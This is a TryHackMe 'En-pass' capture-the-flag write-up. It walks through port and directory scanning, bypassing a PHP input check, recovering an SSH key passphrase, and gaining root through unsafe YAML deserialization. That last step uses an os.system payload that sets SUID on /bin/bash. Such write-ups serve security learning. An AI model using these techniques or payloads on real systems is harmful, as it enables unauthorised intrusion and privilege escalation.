---
layout: post
title:  "TryHackMe En-pass writeup"
date:   2021-02-15 12:59:36 +0200
categories: writeup tryhackme
---

> Think-out-of-the-box

```
nmap -sC -sV -p- 10.10.23.229                                                                                                      255 ⨯
Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-11 19:17 EET
Nmap scan report for 10.10.23.229
Host is up (0.054s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8a:bf:6b:1e:93:71:7c:99:04:59:d3:8d:81:04:af:46 (RSA)
|   256 40:fd:0c:fc:0b:a8:f5:2d:b1:2e:34:81:e5:c7:a5:91 (ECDSA)
|_  256 7b:39:97:f0:6c:8a:ba:38:5f:48:7b:cc:da:72:a8:44 (ED25519)
8001/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: En-Pass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.23.229:8001 -x php,txt,html -t 40 dir       1 ⨯
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.23.229:8001
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt,html
[+] Timeout:        10s
===============================================================
2021/02/11 19:18:31 Starting gobuster
===============================================================
/web (Status: 301)
/index.html (Status: 200)
/reg.php (Status: 200)
/403.php (Status: 403)
/zip (Status: 301)
/server-status (Status: 403)
===============================================================
2021/02/11 19:38:53 Finished
===============================================================
```

First question path: /web/resources/infoseek/configure/key

there is a RSA private key:

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,3A3DBCAED659E70F7293FA98DB8C1802

V0Z7T9g2JZvMMhiZ6JzYWaWo8hubQhVIu3AcrxJZqFD0o2FW1K0bHGLbK8P+SaAc
...
...
...
iU5caghFrCuuhCagiwYr+qeKM3BwMUBPeUXVWTCVmFkA7jR86XTMfjkD1vgDFj/8
-----END RSA PRIVATE KEY-----
```


reg.php source code reveals:

```php
<?php
if($_SERVER["REQUEST_METHOD"] == "POST"){
   $title = $_POST["title"];
   if (!preg_match('/[a-zA-Z0-9]/i' , $title )){        
          $val = explode(",",$title);
          $sum = 0;
          for($i = 0 ; $i < 9; $i++){
                if ( (strlen($val[0]) == 2) and (strlen($val[8]) ==  3 ))  {
                    if ( $val[5] !=$val[8]  and $val[3]!=$val[7] )             
                        $sum = $sum+ (bool)$val[$i]."<br>"; 
                }        
          }
          if ( ($sum) == 9 ){ 
              echo $result;//do not worry you'll get what you need.
              echo " Congo You Got It !! Nice ";
            }
                    else{
                      echo "  Try Try!!";
                    }
          }
          else{
            echo "  Try Again!! ";
          }     
  }
?>
```

deciphering the code: title POST parameter. First may not start with letter or number. Let's make a test code and figure out a string that passes validation.


```php=
<?php

$title = "!!,!,!,!!,!,!!,!,!,!!!,!";

$val = explode(",",$title);

$sum = 0;
 
if (!preg_match('/[a-zA-Z0-9]/i' , $title )){
    for($i = 0 ; $i < 9; $i++){
        if ( (strlen($val[0]) == 2) and (strlen($val[8]) ==  3 ))  {
            if ( $val[5] !=$val[8]  and $val[3]!=$val[7] ) 
                $sum = $sum+ (bool)$val[$i]."<br>"; 
        }
        if ( ($sum) == 9 ){ 
                  echo $result;//do not worry you'll get what you need.
                  echo " Congo You Got It !! Nice ";
                }
    }
} else {
    echo "This kills the crab.";
}
?>
```
running this code at https://www.tehplayground.com/DxYds2xwcIFeapPd seems to produce a passing title string. Entering it to the input in reg.php there is a reply:

`Nice. Password : cimihan_are_you_here?`

It's the passphrase for the public key. Now need to figure out the username to login with SSH. 

## Zip files

There are zipfiles in /zip which contain sadman but not the user we seek.

```bash=
for i in {0..100}
do
  wget -q http://10.10.23.229:8001/zip/a$i.zip
  unzip -o -qq a$i.zip
  cat a
  rm a$i.zip a
done

```
a0.zip in a.zip has different md5sum from all other zip files.

```
cmp -l a0.zip a50.zip | gawk '{printf "%08X %02X %02X\n", $1, strtonum(0$2), strtonum(0$3)}'                                         1 ⨯
00000029 FA FE
```

## Privilege escalation

/opt/scripts/file.py:
```python=
#!/usr/bin/python
import yaml


class Execute():
        def __init__(self,file_name ="/tmp/file.yml"):
                self.file_name = file_name
                self.read_file = open(file_name ,"r")

        def run(self):
                return self.read_file.read()

data  = yaml.load(Execute().run())
```

exploit from here: https://hackmd.io/@harrier/uiuctf20


```
- !!python/object/apply:os.system ["chmod +s /bin/bash"]
```


Learned new tool: https://github.com/DominicBreuker/pspy
